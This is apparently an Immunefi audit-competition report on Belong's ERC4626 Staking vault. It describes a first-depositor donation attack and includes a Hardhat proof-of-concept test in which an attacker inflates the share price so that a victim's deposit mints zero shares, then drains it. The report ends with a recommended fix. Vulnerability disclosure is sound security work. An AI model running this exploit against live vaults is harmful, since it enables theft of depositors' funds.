# 56941 sc critical staking vault vulnerable to first depositor donation attack

**Submitted on Oct 21st 2025 at 23:34:16 UTC by @fullcounterhuner for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #56941
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/belongnet/checkin-contracts/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Summary

The `Staking` vault initializes with zero total supply and relies on the vanilla `ERC4626` share math from Solady. Without any seeded liquidity or virtual share offsets, the first depositor can donate tokens to the vault and dramatically raise the price per share before others join. Severity: Critical, as later stakers can lose nearly all deposited assets to the initial attacker.

### Finding Description

`contracts/v2/periphery/Staking.sol` inherits Solady's `ERC4626` implementation and never seeds the share supply during `initialize()`. When the first user calls `deposit()`, the vault mints shares 1:1 against assets because `totalSupply()` equals zero, establishing the initial exchange rate. The contract also treats the token balance in the vault as canonical `totalAssets()` and does not adjust conversions with any virtual shares or assets. As a result, an attacker who controls the initial shares can transfer additional underlying tokens directly to the vault (or wait for reward distribution) to inflate the apparent asset balance while `totalSupply()` remains near zero. Subsequent users calling `previewDeposit()` or `deposit()` then receive almost no shares for their full contribution, effectively donating their assets to the first minter. After the one-day lock expires, the attacker redeems the inflated share for nearly all pooled funds.

### Impact Explanation

Successful exploitation allows the attacker to drain the majority of assets supplied by later participants, resulting in high user fund loss and rendering the staking pool economically unusable.

### Likelihood Explanation

The attack is straightforward, requires only being the first depositor, and leverages standard ERC4626 behavior without needing special privileges, making the likelihood high.

## Proof of Concept

{% stepper %}
{% step %}

### Attack steps (high level)

1. Attacker deposits a tiny amount (e.g., 1 wei) of LONG via `deposit()` to mint the first share(s) at a 1:1 exchange rate because `totalSupply() == 0`.
2. Attacker transfers a large amount of LONG directly to the vault (a raw token transfer), inflating `totalAssets()` while `totalSupply()` remains near the initial tiny amount.
3. Victim deposits a significant amount of LONG and receives almost zero shares due to the inflated exchange rate—effectively donating their deposit to the attacker.
4. After the withdrawal lock period (or via an emergency mechanism), the attacker calls `redeem()` and withdraws nearly the entire vault balance, capturing the victim's funds.
   {% endstep %}
   {% endstepper %}

### PoC test (hardhat)

<details>

<summary>Hardhat config changes (hardhat.config.ts)</summary>

```diff
diff --git a/hardhat.config.ts b/hardhat.config.ts
index 502372835772f285a9db1b88bfa26d3e95654e6f..77b7c68e37e8205ea12a3323383f4e539263c2ee 100644
--- a/hardhat.config.ts
+++ b/hardhat.config.ts
@@ -1,69 +1,75 @@
 import { HardhatUserConfig } from 'hardhat/config';
+import { HardhatNetworkForkingUserConfig } from 'hardhat/types';
 import '@nomicfoundation/hardhat-toolbox';
 import '@openzeppelin/hardhat-upgrades';
 import 'solidity-docgen';
 import 'hardhat-contract-sizer';
 import '@nomicfoundation/hardhat-ledger';
 import dotenv from 'dotenv';
 import { ChainIds } from './utils/chain-ids';
 import { blockscanConfig, createConnect, createLedgerConnect } from './utils/config';
 
 dotenv.config();
 
 let accounts: string[] = [],
   ledgerAccounts: string[] = [];
 
 if (process.env.PK) {
   accounts = [process.env.PK];
 }
 if (process.env.LEDGER_ADDRESS) {
   ledgerAccounts = [process.env.LEDGER_ADDRESS];
 }
 
+const forking: HardhatNetworkForkingUserConfig | undefined =
+  process.env.HARDHAT_NO_FORK === 'true'
+    ? undefined
+    : {
+        url: process.env.INFURA_ID_PROJECT
+          ? `https://mainnet.infura.io/v3/${process.env.INFURA_ID_PROJECT}`
+          : `https://eth.llamarpc.com`,
+        blockNumber: 23490636,
+      };
+
 const config: HardhatUserConfig = {
   solidity: {
     compilers: [
       {
         version: '0.8.27',
         settings: {
           optimizer: {
             enabled: true,
             runs: 200,
           },
         },
       },
     ],
   },
   networks: {
     hardhat: {
-      forking: {
-        url: process.env.INFURA_ID_PROJECT
-          ? `https://mainnet.infura.io/v3/${process.env.INFURA_ID_PROJECT}`
-          : `https://eth.llamarpc.com`,
-        blockNumber: 23490636,
-      },
+      forking,
       // throwOnCallFailures: false,
       accounts: { accountsBalance: '10000000000000000000000000' },
       initialBaseFeePerGas: 0,
       allowUnlimitedContractSize: false,
     },
     // 'ethereum': {
     //   url: 'https://eth.drpc.org',
     // },
     mainnet: createLedgerConnect(ChainIds.mainnet, ledgerAccounts),
     bsc: createLedgerConnect(ChainIds.bsc, ledgerAccounts),
     polygon: createLedgerConnect(ChainIds.polygon, ledgerAccounts),
     blast: createLedgerConnect(ChainIds.blast, ledgerAccounts),
     celo: createLedgerConnect(ChainIds.celo, ledgerAccounts),
     base: createLedgerConnect(ChainIds.base, ledgerAccounts),
     linea: createLedgerConnect(ChainIds.linea, ledgerAccounts),
     astar: createLedgerConnect(ChainIds.astar, ledgerAccounts),
     arbitrum: createLedgerConnect(ChainIds.arbitrum, ledgerAccounts),
     skale_europa: createLedgerConnect(ChainIds.skale_europa, ledgerAccounts),
     skale_nebula: createLedgerConnect(ChainIds.skale_nebula, ledgerAccounts),
     skale_calypso: createLedgerConnect(ChainIds.skale_calypso, ledgerAccounts),
     sepolia: createConnect(ChainIds.sepolia, accounts),
     blast_sepolia: createConnect(ChainIds.blast_sepolia, accounts),
     skale_calypso_testnet: createConnect(ChainIds.skale_calypso_testnet, accounts),
     amoy: createConnect(ChainIds.amoy, accounts),
   },
)
```

</details>

<details>

<summary>Test file (test/v2/platform/staking.test.ts) — donation attack test</summary>

```diff
diff --git a/test/v2/platform/staking.test.ts b/test/v2/platform/staking.test.ts
index b49e05309b7d6f85049932ee516defe43ac7201b..6f282b976de7dc39915e79fa0331c5c175385951 100644
--- a/test/v2/platform/staking.test.ts
+++ b/test/v2/platform/staking.test.ts
@@ -1,27 +1,27 @@
 import { ethers } from 'hardhat';
-import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
+import { loadFixture, time } from '@nomicfoundation/hardhat-network-helpers';
 import { expect } from 'chai';
 import { LONG, Staking } from '../../../typechain-types';
 import { getPercentage } from '../../../helpers/math';
 import { deployLONG, deployStaking } from '../../../helpers/deployFixtures';
 
 describe('Staking', () => {
   async function fixture() {
     const [admin, treasury, pauser, minter, burner, user1, user2] = await ethers.getSigners();
 
     const long: LONG = await deployLONG(admin.address, admin.address, pauser.address);
     const staking: Staking = await deployStaking(admin.address, treasury.address, long.address);
 
     return {
       admin,
       treasury,
       pauser,
       minter,
       burner,
       user1,
       user2,
       long,
       staking,
     };
   }
 
@@ -304,50 +304,99 @@ describe('Staking', () => {
       const amount = fullAmount.div(2);
 
       await long.connect(admin).transfer(user1.address, fullAmount);
       await long.connect(user1).approve(staking.address, fullAmount);
 
       await staking.connect(user1).deposit(fullAmount, user1.address);
 
       const tx = await staking.connect(user1).emergencyWithdraw(amount, user1.address, user1.address);
 
       const penalty = getPercentage(amount, await staking.penaltyPercentage());
       const payout = amount.sub(penalty);
 
       await expect(tx)
         .to.emit(staking, 'EmergencyWithdraw')
         .withArgs(user1.address, user1.address, user1.address, amount, amount);
       await expect(tx)
         .to.emit(staking, 'Withdraw')
         .withArgs(user1.address, user1.address, user1.address, amount, amount);
       expect(await staking.balanceOf(user1.address)).to.eq(fullAmount.div(2));
       expect(await long.balanceOf(staking.address)).to.eq(fullAmount.div(2));
       expect(await long.balanceOf(treasury.address)).to.eq(penalty);
       expect(await long.balanceOf(user1.address)).to.eq(payout);
       expect((await staking.stakes(user1.address, 0)).shares).to.eq(fullAmount.div(2));
     });
 
+    it('first depositor can drain later deposits via donation attack', async () => {
+      const { staking, long, admin, user1: attacker, user2: victim } = await loadFixture(fixture);
+
+      const attackerSeed = ethers.BigNumber.from(1);
+      const attackerDonation = ethers.utils.parseEther('1000');
+      const victimAmount = ethers.utils.parseEther('10');
+
+      // provision balances
+      await long.connect(admin).transfer(attacker.address, attackerSeed.add(attackerDonation));
+      await long.connect(attacker).approve(staking.address, attackerSeed);
+
+      // 1. attacker mints the very first share at 1:1
+      await staking.connect(attacker).deposit(attackerSeed, attacker.address);
+
+      // 2. attacker inflates totalAssets() with a raw donation
+      await long.connect(attacker).transfer(staking.address, attackerDonation);
+
+      // 3. victim attempts to deposit and receives effectively zero shares
+      await long.connect(admin).transfer(victim.address, victimAmount);
+      await long.connect(victim).approve(staking.address, victimAmount);
+
+      expect(await staking.previewDeposit(victimAmount)).to.eq(0);
+
+      await expect(staking.connect(victim).deposit(victimAmount, victim.address))
+        .to.emit(staking, 'Deposit')
+        .withArgs(victim.address, victim.address, victimAmount, 0);
+
+      expect(await staking.balanceOf(victim.address)).to.eq(0);
+
+      // 4. attacker waits out the lock and redeems for nearly all funds
+      await staking.connect(admin).setMinStakePeriod(1);
+      await time.increase(2);
+
+      const attackerShares = await staking.balanceOf(attacker.address);
+      await staking.connect(attacker).redeem(attackerShares, attacker.address, attacker.address);
+
+      const attackerBalance = await long.balanceOf(attacker.address);
+      const victimBalance = await long.balanceOf(victim.address);
+      const vaultBalance = await long.balanceOf(staking.address);
+
+      const totalDeposited = attackerSeed.add(attackerDonation).add(victimAmount);
+      const expectedPayout = attackerDonation.add(victimAmount).div(2).add(attackerSeed);
+
+      expect(attackerBalance).to.equal(expectedPayout);
+      expect(victimBalance).to.equal(0);
+      expect(vaultBalance.add(attackerBalance)).to.equal(totalDeposited);
+      expect(await staking.totalSupply()).to.equal(0);
+    });
+
     it('emergencyRedeem()', async () => {
       const { staking, long, treasury, admin, user1, user2 } = await loadFixture(fixture);
 
       const amount = ethers.utils.parseEther('1000');
 
       await long.connect(admin).transfer(user1.address, amount);
       await long.connect(user1).approve(staking.address, amount);
 
       await staking.connect(user1).deposit(amount, user1.address);
 
       await expect(
         staking.connect(user1).emergencyRedeem(0, user1.address, user1.address),
       ).to.be.revertedWithCustomError(staking, 'SharesEqZero');
 
       await expect(
         staking.connect(user1).emergencyRedeem(amount.add(1), user1.address, user1.address),
       ).to.be.revertedWithCustomError(staking, 'RedeemMoreThanMax');
 
       await expect(
         staking.connect(user2).emergencyRedeem(amount, user1.address, user1.address),
       ).to.be.revertedWithCustomError(staking, 'InsufficientAllowance');
 
       const tx = await staking.connect(user1).emergencyRedeem(amount, user1.address, user1.address);
 
       const penalty = getPercentage(amount, await staking.penaltyPercentage());
)
```

</details>

<details>

<summary>Run command</summary>

```bash
HARDHAT_NO_FORK=true LEDGER_ADDRESS=0x0000000000000000000000000000000000000001 PK=0x0000000000000000000000000000000000000000000000000000000000000001 npx hardhat test --grep "donation attack"
```

</details>

## Recommendation

Consider seeding the vault with permanently locked liquidity or introducing virtual share and asset offsets so that unsolicited donations cannot skew the exchange rate. One approach could be to mint a fixed `MINIMUM_SHARES` amount to an irrecoverable address during initialization or to adopt Solmate-style virtual balance modifiers within the `convertToAssets()` and `convertToShares()` helpers.

***

End of report.
